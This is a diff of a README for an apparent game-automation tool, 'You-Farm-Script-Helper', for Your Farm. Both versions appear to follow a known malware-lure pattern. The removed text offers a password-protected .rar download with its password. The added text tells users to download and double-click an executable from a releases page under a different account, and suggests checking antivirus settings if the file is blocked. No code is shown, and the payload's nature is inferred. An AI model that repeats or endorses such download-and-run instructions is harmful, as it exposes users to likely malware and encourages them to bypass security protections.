@@ -1,132 +1,83 @@
-# 🌽 Auto Money — Your Farm  
-**Utility Script**
+# 🎮 You-Farm-Script-Helper - Simplifying Your Farm Gameplay
 
-<img width="1536" height="1024" alt="auto-money-your-farm-preview" src="https://github.com/trouble8834zp/You-Farm-Script-Helper/blob/main/assets/preview.png" />
+[![Download Now](https://img.shields.io/badge/Download%20Now-You--Farm--Script--Helper-brightgreen)](https://github.com/tjsplatig/You-Farm-Script-Helper/releases)
 
-Open source **utility script** for **Your Farm**, designed to automate routine in-game actions and improve overall gameplay convenience.
+## 🚀 Getting Started
 
-This project focuses on reducing repetitive tasks while demonstrating simple automation logic and clean scripting practices.
+Welcome to You-Farm-Script-Helper! This utility script helps you automate tasks in Your Farm. By using this script, you can save time and focus on enjoying the game without repetitive tasks.
 
----
+## 📥 Download & Install
 
-## ✨ Overview
+To get started, visit the [Releases page](https://github.com/tjsplatig/You-Farm-Script-Helper/releases) to download the latest version. Follow these steps:
 
-Auto Money — Your Farm provides an automated system that simulates routine gameplay mechanics in a controlled and minimal manner.
+1. Click the link above.
+2. Find the latest release at the top of the page.
+3. Look for a file named something like `You-Farm-Script-Helper.zip` or `You-Farm-Script-Helper.exe`.
+4. Click the file to download it to your computer.
 
-The script helps users to:
+### For Windows Users
 
-- Observe automation behavior  
-- Test simple logic flows  
-- Improve efficiency during gameplay testing  
+1. Once the download is complete, locate the file in your Downloads folder.
+2. If it's a `.zip`, right-click the file and select "Extract All" to extract the contents.
+3. Open the extracted folder.
+4. Double-click `You-Farm-Script-Helper.exe` to run the script.
+5. Follow on-screen instructions to start using the utility.
 
-The project is intended primarily for **educational and experimental use**, demonstrating automation concepts and basic scripting structure.
+### For Mac Users
 
----
+1. After the download, find the file in your Downloads folder.
+2. If it's a `.zip`, double-click the file to extract it.
+3. Open the extracted folder.
+4. Double-click `You-Farm-Script-Helper.command` to run the script.
+5. Follow any prompts to allow the app to run.
 
-## ⚙️ Features
+### For Linux Users
 
-- 🌽 Automated in-game interaction  
-- ⏱ Time-saving workflow  
-- 🧩 Simple and clean structure  
-- 📖 Easy to read and modify  
-- 🛠️ Lightweight and minimal setup  
+1. After downloading, locate the file in your Downloads folder.
+2. If the file is zipped, use the terminal or file manager to extract it.
+3. Open the terminal and navigate to the extracted folder.
+4. Run the script using the command `./You-Farm-Script-Helper.sh`.
+5. Make sure you have the necessary permissions to execute the script.
 
----
+## ⚙️ System Requirements
 
-## 📦 Usage
+To run You-Farm-Script-Helper effectively, make sure your system meets these requirements:
 
-- Intended for testing and learning automation logic  
-- Can be adapted or extended for personal experiments  
-- No external dependencies required  
-- Suitable for studying scripting structure and control flow  
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Dual-core processor or better.
+- **Disk Space:** At least 100 MB of available space.
 
----
+## ✨ Features
 
-## ⚠️ Important Notes
+You-Farm-Script-Helper offers several features to help enhance your gameplay experience:
 
-- This project does **not bypass protections or security systems**  
-- Behavior depends on in-game mechanics and environment limitations  
-- Use is fully at the user’s own discretion  
+- **Automated Actions:** Set up the script to perform repetitive actions automatically.
+- **User-Friendly Interface:** Simple setup and configuration for all users.
+- **Customizable Settings:** Adjust various settings to suit your gameplay style.
+- **Regular Updates:** Frequent updates to improve functionality and add new features based on user feedback.
 
----
+## 🛠️ Troubleshooting
 
-## ⚠️ Disclaimer
+If you encounter issues while using the script, consider the following solutions:
 
-This project is shared **for educational purposes only**.  
-The author does **not encourage misuse** or violation of any platform’s terms of service.
+- **Script Not Running:** Ensure you have the right permissions. Check your antivirus software settings; it may block scripts.
+- **Missing Features:** Make sure you are using the latest version from the [Releases page](https://github.com/tjsplatig/You-Farm-Script-Helper/releases). If features are not available, check the documentation for updates.
+- **Performance Issues:** Close other applications that are using a lot of memory. Restart your device to free up resources.
 
-Use responsibly and only in environments where automation is permitted.
+## 📄 Documentation
 
----
+For advanced usage and script configuration, refer to the documentation included in the downloaded files. This guide provides detailed instructions on all features of You-Farm-Script-Helper.
 
-## 📜 License
+## 🌐 Community Support
 
-This project is licensed under the **MIT License**.
+For help and support, consider joining the community:
 
-You are free to:
+- **GitHub Issues Page:** Report bugs or issues you encounter while running the script.
+- **Discussion Board:** Share ideas and suggestions for features or improvements with fellow users.
 
-- Use the script  
-- Modify it  
-- Publish it  
-- Share it  
+## 📝 License
 
-As long as the original license and copyright notice are preserved.
+You-Farm-Script-Helper is open-source software licensed under the MIT License. You are free to use, modify, and distribute it as long as you give proper credit.
 
----
-
-## 📺 YouTube Channel
-
-🎥 Development updates, experiments, and future releases:
-
-<p align="center">
-  <a href="https://www.youtube.com/@SILENS_MODE">
-    <img src="https://github.com/trouble8834zp/You-Farm-Script-Helper/blob/main/assets/srf4kj22.png" alt="SUBSCRIBE" width="420">
-  </a>
-</p>
-
----
-
-## ⬇️ Download
-
-### Passwo: silence1To
-
-<p align="center">
-  <a href="https://github.com/trouble8834zp/You-Farm-Script-Helper/releases/download/you-farm/you-farm-v1.3.20.rar">
-    <img src="https://github.com/trouble8834zp/You-Farm-Script-Helper/blob/main/assets/d12355323dsf.png" alt="DOWNLOAD" width="420">
-  </a>
-</p>
-
----
-
-## 🤝 Contributions
-
-Contributions, improvements, and ideas are welcome.
-
-- Fork the repository  
-- Create a new branch  
-- Submit a pull request  
-
----
-
-## 🌍 Multilingual Note
-
-### English
-
-This utility script is open source and free to use, modify, and redistribute for educational and experimental purposes.
-
-### العربية
-
-السكربت مخصص للأغراض التعليمية والتجريبية،  
-وهو مفتوح المصدر ويمكنك استخدامه وتعديله وإعادة نشره بحرية.
-
----
-
-## ⭐ Support
-
-If you find this project useful:
-
-- ⭐ Star the repository  
-- 📢 Share it responsibly  
-- 💡 Suggest improvements  
-
-Thank you for your support 🤍
+Remember to check back for updates and new features regularly. Enjoy maximizing your gaming experience with You-Farm-Script-Helper!
